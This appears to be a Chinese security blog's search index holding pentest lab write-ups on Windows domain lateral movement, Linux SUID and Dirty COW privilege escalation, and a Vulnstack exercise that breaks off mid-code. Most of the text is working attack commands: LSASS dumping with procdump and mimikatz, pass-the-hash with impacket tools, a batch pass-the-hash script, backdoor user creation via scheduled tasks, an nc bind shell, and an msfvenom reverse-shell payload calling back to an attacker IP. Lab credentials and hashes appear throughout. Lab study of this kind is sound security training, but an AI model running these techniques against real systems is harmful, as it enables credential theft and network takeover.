<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网渗透之横向移动</title>
      <link href="/2023/03/31/blog4/"/>
      <url>/2023/03/31/blog4/</url>
      
        <content type="html"><![CDATA[<h1 id="实验靶机"><a href="#实验靶机" class="headerlink" title="实验靶机"></a>实验靶机</h1><p>windows server 2012<br>域控DC 192.168.31.1<br>域控账户：<br>administrator<br>root<br>域:<br>hacker.lab</p><p>win10<br>域内主机 192.168.31.2<br>本地管理员账户:<br>administrator<br>admin123#<br>域用户:<br>admin123<br>Root123@</p><p>win10<br>域内主机 192.168.31.3<br>本地管理员账户:<br>administrator<br>admin123#<br>域用户:<br>Admin<br>Asd123@ </p><h1 id="内网渗透之信息收集"><a href="#内网渗透之信息收集" class="headerlink" title="内网渗透之信息收集"></a>内网渗透之信息收集</h1><h2 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h2><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备<br>systeminfo 详细信息<br>net start 启动服务<br>tasklist 进程列表<br>schtasks 计划任务</p><h2 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h2><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备<br>ipconfig &#x2F;all 判断存在域-dns<br>net view &#x2F;domain 判断存在域<br>net time &#x2F;domain 判断主域<br>netstat -ano 当前网络端口开放<br>nslookup 域名 追踪来源地址</p><h2 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h2><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试<br>系统默认常见用户身份：<br>Domain Admins：域管理员（默认对域控制器有完全控制权）<br>Domain Computers：域内机器<br>Domain Controllers：域控制器<br>Domain Guest：域访客，权限低<br>Domain Users：域用户<br>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</p><p>相关用户收集操作命令：<br>whoami &#x2F;all 用户权限<br>net config workstation 登录信息<br>net user 本地用户<br>net localgroup 本地用户组<br>net user &#x2F;domain 获取域用户信息<br>net group &#x2F;domain 获取域用户组信息<br>wmic useraccount get &#x2F;all 涉及域用户详细信息<br>net group “Domain Admins” &#x2F;domain 查询域管理员账户<br>net group “Enterprise Admins” &#x2F;domain 查询管理员用户组<br>net group “Domain Controllers” &#x2F;domain 查询域控制器</p><h2 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h2><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)</p><h1 id="at-schtasks-impacket工具包的使用"><a href="#at-schtasks-impacket工具包的使用" class="headerlink" title="at,schtasks,impacket工具包的使用"></a>at,schtasks,impacket工具包的使用</h1><h2 id="案例1–at-amp-amp-schatcks"><a href="#案例1–at-amp-amp-schatcks" class="headerlink" title="案例1–at&amp;&amp;schatcks"></a>案例1–at&amp;&amp;schatcks</h2><p>在拿下内网中的一台主机后，通过mimikatz收集了相关的明文密码，hash，凭据后。<br>在已知目标主机的用户明文密码后，可以直接远程执行命令</p><h3 id="横向移动过程"><a href="#横向移动过程" class="headerlink" title="横向移动过程"></a>横向移动过程</h3><p>取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</p><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><ol><li>建立 IPC 链接到目标主机</li><li>拷贝要执行的命令脚本到目标主机</li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li><li>删除 IPC 链接</li></ol><p><code>net use \\server\ipc$&quot;password&quot; /user:username</code> # 工作组<br><code>net use \\server\ipc$&quot;password&quot; /user:domain\username </code>#域内<br><code>dir \\xx.xx.xx.xx\C$\ </code># 查看文件列表<br><code>copy \\xx.xx.xx.xx\C$\1.bat 1.bat</code> # 下载文件<br><code>copy 1.bat \\xx.xx.xx.xx\C$</code> # 复制文件<br><code>net use \\xx.xx.xx.xx\C$\1.bat /del </code># 删除 IPC<br><code>net view xx.xx.xx.xx</code> # 查看对方共享<br>(注意ipc连接需要开启139或445端口，在&gt;&#x3D;Windows server 2012的版本，at命令已被弃用)<br>at &lt; Windows2012<br><code>net use \\192.168.31.3\ipc$ &quot;admin123#&quot; /user:administrator </code># 建立 ipc 连接<br><code>copy add.bat \\192.168.31.3\c$</code> #拷贝执行文件到目标机器<br><code>at \\192.168.31.3 15:47 c:\add.bat</code> #添加计划任务</p><p>schtasks &gt;&#x3D;Windows2012<br><code>net use \\192.168.31.3\ipc$ &quot;admin123#&quot; /user:administrator</code> # 建立 ipc 连接：<br><code>copy add.bat \\192.168.31.3\c$</code> #复制文件到其 C 盘<br><code>schtasks /create /s 192.168.31.3 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F</code> #创建 adduser 任务对应执行文件<br><code>schtasks /run /s 192.168.31.3 /tn adduser /i</code> #运行 adduser 任务<br><code>schtasks /delete /s 192.168.31.3 /tn adduser /f </code>#删除 adduser 任务</p><h3 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h3><p>[知识点1:<br>Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码<br>windows2012以下版本如安KB2871997补丁，同样也会导致无法获取明文密码<br>知识点2:<br>windows系统LM Hash及NTLM Hash加密算法，个人系统在windows vista后，服务器系统在windows 2003以后，认证方式均为NTLM Hash<br>知识点3:<br>可以通过修改注册表让Wdigest Auth保存明文口令,重启后即可抓取明文密码<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code><br>mimikatz抓取的明文密码为null<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/1.png" alt="1"><br>修改注册表后<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/2.png" alt="1"><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/3.png" alt="1"><br>如需恢复原样，只需将REG_DWORD的值1改为0即可<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</code><br>]</p><p>已经拿到了域内主机win7，并且上传了mimikatz，拿到了明文密码和hash<br>administrator<br>admin123#<br>ntlm:1f732ce21a56719cbfe8d95a88f87729<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/3.png" alt="1"></p><ul><li>建立ipc连接<br>net use \192.168.31.3\ipc$ “admin123#”  &#x2F;user:administrator<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/4.png" alt="1"></li><li>将要执行的1.bat复制到192.168.31.3上<br>1.bat中的命令为：<br><code>net user hello  Admin123# /add </code> (添加一个hello用户)<br><code>copy 1.bat  \\192.168.31.3\c$</code><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/5.png" alt="1"></li><li>运行1.bat文件<br><code>schtasks /create /s 192.168.31.3 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\1.bat /F</code> #创建 adduser 任务对应执行文件<br><code>schtasks /run /s 192.168.31.3 /tn adduser /i </code>#运行 adduser 任务<br><code>schtasks /delete /s 192.168.31.3 /tn adduser </code>&#x2F;f#删除 adduser 任务<br>成功创建了hello用户<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/8.png" alt="1"><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/7.png" alt="1"></li></ul><h2 id="案例2–-impacket-atexec横向渗透明文-HASH-传递"><a href="#案例2–-impacket-atexec横向渗透明文-HASH-传递" class="headerlink" title="案例2– impacket-atexec横向渗透明文 HASH 传递"></a>案例2– impacket-atexec横向渗透明文 HASH 传递</h2><p><code>atexec.exe ./administrator:admin123#@192.168.31.3 &quot;whoami&quot;  </code>  #本地用户<br><code>atexec.exe god/administrator:admin123#@192.168.31.3 &quot;whoami&quot; </code> # 域用户<br><code>atexec.exe -hashes :1f732ce21a56719cbfe8d95a88f87729 ./administrator@192.168.31.3 &quot;whoami&quot;  </code></p><h3 id="操作演示-1"><a href="#操作演示-1" class="headerlink" title="操作演示"></a>操作演示</h3><ul><li>明文传递本地用户<br>atexec.exe .&#x2F;administrator:admin123#@192.168.31.3 “whoami”<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/9.png" alt="1"><br>atexec.exe .&#x2F;administrator:admin123#@192.168.31.3 “ipconfig”<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/10.png" alt="1"></li><li>明文传递域用户<br>atexec.exe hacker&#x2F;Admin:Asd123@@192.168.31.3 “whoami”<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/11.png" alt="1"></li><li>hash传递<br>atexec.exe -hashes :1f732ce21a56719cbfe8d95a88f87729 .&#x2F;<a href="mailto:&#x61;&#100;&#109;&#x69;&#x6e;&#x69;&#115;&#x74;&#114;&#97;&#x74;&#111;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#49;&#x2e;&#x33;">&#x61;&#100;&#109;&#x69;&#x6e;&#x69;&#115;&#x74;&#114;&#97;&#x74;&#111;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#49;&#x2e;&#x33;</a> “whoami”<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/12.png" alt="1"></li></ul><h2 id="案例3-横向渗透明文-HASH-传递批量利用"><a href="#案例3-横向渗透明文-HASH-传递批量利用" class="headerlink" title="案例3-横向渗透明文 HASH 传递批量利用"></a>案例3-横向渗透明文 HASH 传递批量利用</h2><ol><li>FOR &#x2F;F %%i in (ips.txt) do net use \%%i\ipc$ “admin!@#45” &#x2F;user:administrator #批量检测 IP 对应明文连接</li><li>FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文回显版</li><li>FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;administrator:%%<a href="mailto:&#x69;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x33;&#x2e;&#x32;&#49;">&#x69;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#x33;&#x2e;&#x32;&#49;</a> whoami #批量检测明文对应 IP回显版</li><li>FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;<a href="mailto:&#x61;&#100;&#109;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#51;&#46;&#50;&#x31;">&#x61;&#100;&#109;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#114;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#51;&#46;&#50;&#x31;</a> whoami #批量检测HASH 对应 IP 回显版</li></ol><h1 id="横向smb-amp-wmi明文或hash传递"><a href="#横向smb-amp-wmi明文或hash传递" class="headerlink" title="横向smb&amp;wmi明文或hash传递"></a>横向smb&amp;wmi明文或hash传递</h1><h2 id="案例1–-Procdump-Mimikatz-配合获取"><a href="#案例1–-Procdump-Mimikatz-配合获取" class="headerlink" title="案例1– Procdump+Mimikatz 配合获取"></a>案例1– Procdump+Mimikatz 配合获取</h2><p>Procdump为微软官方自带，不容易被查杀。<br>当拿下域内主机后，无法上传mimikatz或上传后被查杀，可以上传Procdump下载域内主机的明文和hash，再回来本机用mimikatz运行<br><code>procdump -accepteula -ma lsass.exe lsass.dmp</code><br>mimikatz 上执行：<br><code>sekurlsa::minidump lsass.dmp</code><br><code>sekurlsa::logonPasswords full</code></p><ol><li>使用procdump获取明文和hash，储存到lsass.dmp<br><code>procdump -accepteula -ma lsass.exe lsass.dmp</code><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/13.png" alt="1"></li><li>将lsass.dmp放入本机下的mimikatz文件夹中，启动mimikatz,获得靶机的明文和hash<br><code>sekurlsa::minidump lsass.dmp</code><br><code>sekurlsa::logonPasswords full</code><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/14.png" alt="1"></li></ol><h2 id="案例2–-域横向移动-SMB-服务利用-psexec-smbexec"><a href="#案例2–-域横向移动-SMB-服务利用-psexec-smbexec" class="headerlink" title="案例2– 域横向移动 SMB 服务利用-psexec,smbexec"></a>案例2– 域横向移动 SMB 服务利用-psexec,smbexec</h2><h3 id="psexec-分为官方和impacket"><a href="#psexec-分为官方和impacket" class="headerlink" title="psexec(分为官方和impacket)"></a>psexec(分为官方和impacket)</h3><ol><li>第一种，先建立ipc连接<br><code>net use \\192.168.31.3\ipc$ &quot;admin123#&quot; /user:administrator</code><br><code>psexec \\192.168.31.3 -s cmd </code># 需要先有 ipc 链接 -s 以 System 权限运行<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/15.png" alt="1"></li><li>第二种，不用建立 IPC 直接提供明文账户密码<br><code>psexec \\192.168.31.3 -u administrator -p admin123# -s cmd</code><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/16.png" alt="1"></li><li>官方的pstools不能进行hash连接，使用impacket工具<br><code>psexec -hashes :$HASH$ ./administrator@192.168.31.3  </code>   本地用户<br><code>psexec -hashes :$HASH$ domain/administrator@192.168.31.3 </code>    域用户<br><code>psexec -hashes :1f732ce21a56719cbfe8d95a88f87729 ./administrator@192.168.31.3 </code><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/17.png" alt="1"></li></ol><h2 id="案例3–-域横向移动-WMI-服务利用-cscript-wmiexec-wmic"><a href="#案例3–-域横向移动-WMI-服务利用-cscript-wmiexec-wmic" class="headerlink" title="案例3– 域横向移动 WMI 服务利用-cscript,wmiexec,wmic"></a>案例3– 域横向移动 WMI 服务利用-cscript,wmiexec,wmic</h2><ol><li>自带 WMIC 明文传递 无回显<br><code>wmic /node:192.168.31.3 /user:administrator /password:admin123# process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</code></li><li>自带 cscript 明文传递 有回显<br><code>cscript //nologo wmiexec.vbs /shell 192.168.31.3 administrator admin123#</code></li><li>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本<br><code>wmiexec ./administrator:admin123#@192.168.31.3 &quot;whoami&quot;</code><br><code>wmiexec hacker/Admin:Asd123#@192.168.31.3 &quot;whoami&quot;</code><br><code>wmiexec -hashes :1f732ce21a56719cbfe8d95a88f87729 ./administrator@192.168.31.3 &quot;whoami&quot;</code><br><code>wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</code><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/18.png" alt="1"><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/19.png" alt="1"></li></ol><h2 id="案例-4-域横向移动以上服务-hash-批量利用-python-编译-exe"><a href="#案例-4-域横向移动以上服务-hash-批量利用-python-编译-exe" class="headerlink" title="案例 4-域横向移动以上服务 hash 批量利用-python 编译 exe"></a>案例 4-域横向移动以上服务 hash 批量利用-python 编译 exe</h2><ol><li>编写python脚本进行批量爆破<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line"></span><br><span class="line">ips = &#123;</span><br><span class="line">    <span class="string">&#x27;192.168.31.10&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.31.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.31.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.31.3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.31.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">hashs = &#123;</span><br><span class="line">    <span class="string">&#x27;1f732ce21a56719cbfe8d95a88f87729&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line">            <span class="comment"># wmiexec -hashes :hashgod/user@ipwhoami</span></span><br><span class="line">            <span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span> + mimahash + <span class="string">&quot; ./&quot;</span> + user + <span class="string">&quot;@&quot;</span> + ip + <span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure></li><li>将python脚本转换为exe<br><code>pyinstaller -F test.py</code></li><li>放入域内主机执行，192.168.31.3 执行成功<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/blog4/20.png" alt="1"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux脏牛内核漏洞&amp;SUID提权</title>
      <link href="/2023/03/22/blog3/"/>
      <url>/2023/03/22/blog3/</url>
      
        <content type="html"><![CDATA[<p>信息搜集工具: LinEnum,linuxprivchecker<br>漏洞探针： linux-exploit-suggester linux-exploit-suggester2</p><h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux&#x2F;Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。<br>若以下命令有suid权限，则可以进行suid提权</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>开启kail和靶机,扫描网段<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/1.png" alt="1"><br>发现靶机ip,对靶机进行端口扫描<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/2.png" alt="1"><br>访问80端口,知道是drupal搭建的<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/3.png" alt="1"><br>使用whatweb进行指纹扫描,得到drupal的版本是drupal 7<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/4.png" alt="1"><br>使用msfconsole,search drupal 中的模块进行攻击<br>search drupal<br>use 2<br>set rhost 192.168.222.131<br>run<br>拿到shell,但只是低权限，进行提权,上传LinEnum进行信息收集<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/5.png" alt="1"><br>可以看到存在一个可以利用的sudi漏洞–find<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/6.png" alt="1"><br>执行下面代码<br>touch test<br>find test -exec whoami ;<br>我们的权限已经升为root<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/7.png" alt="1"><br>也可以反弹到kail上<br>touch test<br>find test -exec nc -lvvp 3333 -e &#x2F;bin&#x2F;sh ;<br>成功反弹，权限为root<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/8.png" alt="1"></p><p>总结:SUID会以root的权限执行命令,这样就导致我们可以利用root权限来运行suid文件或命令，当我们运行文件或命令是就获得了root权限。<br>参考:<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><h1 id="Linux脏牛内核提权"><a href="#Linux脏牛内核提权" class="headerlink" title="Linux脏牛内核提权"></a>Linux脏牛内核提权</h1><p>开启攻击机kail和靶机<br>扫描kail网端，确定靶机ip为192.168.222.130<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/9.png" alt="1"><br>扫描靶机端口，访问1898端口，发现是drupal框架<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/10.png" alt="1"><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/12.png" alt="1"><br>使用whatweb进行指纹扫描，发现drupal 7 版本<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/11.png" alt="1"><br>使用msfconsole进行攻击<br>search drupal<br>use  1<br>set rhost 192.168.222.130<br>set rport 1898<br>run<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/13.png" alt="1"><br>上传漏洞探针到靶机<br>upload &#x2F;tmp&#x2F;linux-exploit-suggester.sh  &#x2F;tmp&#x2F;1.sh<br>赋予权限，执行，发现有脏牛漏洞可以利用<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/14.png" alt="1"><br>下载脏牛漏洞exp，上传到靶机<br>searchsploit dirty<br>locate  linux&#x2F;local&#x2F;40847.cpp<br>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp &#x2F;tmp&#x2F;123.cpp<br>upload &#x2F;tmp&#x2F;123.cpp &#x2F;tmp&#x2F;123.cpp<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/17.png" alt="1"><br>将上传的c++文件编译为可执行文件<br>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o test 123.cpp -lutil<br>chomd 777 test<br>.&#x2F;test<br>利用python 开始交互式终端，输入密码拿到root 权限<br>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’<br>su root<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/15.png" alt="1"><br>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告<br>-pedantic 允许发出ANSI&#x2F;ISO C标准所列出的所有警告<br>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高<br>-std&#x3D;c++11就是用按C++2011标准来编译的<br>-pthread 在Linux中要用到多线程时，需要链接pthread库<br>-o dcow gcc生成的目标文件,名字为dcow<br>获得flag<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/16.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一次尝试</title>
      <link href="/2022/12/12/blog2/"/>
      <url>/2022/12/12/blog2/</url>
      
        <content type="html"><![CDATA[<h2 id="我不爱学习"><a href="#我不爱学习" class="headerlink" title="我不爱学习"></a>我不爱学习</h2>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vnlnstack(一)</title>
      <link href="/2022/12/11/blog/"/>
      <url>/2022/12/11/blog/</url>
      
        <content type="html"><![CDATA[<h1 id="已经拿到webshell-进入内网环境"><a href="#已经拿到webshell-进入内网环境" class="headerlink" title="已经拿到webshell,进入内网环境"></a>已经拿到webshell,进入内网环境</h1><p>首先攻击机为kail ip:192.168.121.128<br>域内主机:<br>win7 两张网卡 ip分别为:192.168.121.129<br>                      192.168.52.143<br>域控windows server 2008  ip:192.168.52.139  </p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h3><ol><li><p>生成msf木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.121.128 lport=4000 -f exe &gt; 123.exe</span><br></pre></td></tr></table></figure></li><li><p>将生成的木马通过webshell上传<br><img src="/image/vulnstack1/1.png" alt="1"></p></li><li><p>启动msf监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost  192.168.121.128</span><br><span class="line">set lport  4000</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>启动上传的木马<br><img src="/image/vulnstack1/2.png" alt="2"></p></li><li><p>这里可以看到我们已经监听成功了,并且提升到system权限<br><img src="/image/vulnstack1/3.png" alt="3"></p></li></ol><h3 id="cs提权"><a href="#cs提权" class="headerlink" title="cs提权"></a>cs提权</h3><ol><li><p>创建一个监听器<br><img src="/image/vulnstack1/4.png" alt="4"></p></li><li><p>利用cs生成一个木马<br><img src="/image/vulnstack1/5.png" alt="1"></p></li><li><p>将木马上传并启动</p></li><li><p>ok！cs这里已经上线一台<br><img src="/image/vulnstack1/6.png" alt="1"></p></li><li><p>提取。拿到system<br><img src="/image/vulnstack1/7.png" alt="1"><br><img src="/image/vulnstack1/8.png" alt="1"></p></li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集命令(部分)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line">net start 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br><span class="line">ipconfig /all 判断存在域-dns</span><br><span class="line">net view /domain 判断存在域</span><br><span class="line">net time /domain 判断主域</span><br><span class="line">netstat -ano 当前网络端口开放</span><br><span class="line">nslookup 域名 追踪来源地址</span><br><span class="line">whoami /all 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net user 本地用户</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 获取域用户信息</span><br><span class="line">net group /domain 获取域用户组信息</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br><span class="line">nbtscan 192.168.3.0/24 第三方工具</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 自带内部命令</span><br><span class="line">nmap masscan 第三方 PowerShell 脚本 nishang empire 等</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>判断域是否存在<br><img src="/image/vulnstack1/9.png" alt="1"></p></li><li><p>查看端口信息<br><img src="/image/vulnstack1/10.png" alt="1"></p></li><li><p>查看本地用户<br><img src="/image/vulnstack1/11.png" alt="1"></p></li><li><p>查看本地用户组<br><img src="/image/vulnstack1/12.png" alt="1"></p></li><li><p>查询域控ip<br>可以使用ping 域控名字 来获得域控ip,但我这环境好像出问题了<br>使用for循环来ping主机<br><img src="/image/vulnstack1/13.png" alt="1"></p></li><li><p>进程信息<br><img src="/image/vulnstack1/14.png" alt="1"></p></li><li><p>利用cs上的mimikatz爆出明文密码和hash<br><img src="/image/vulnstack1/15.png" alt="1"></p></li></ul><p>利用信息收集到的信息我们知道了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 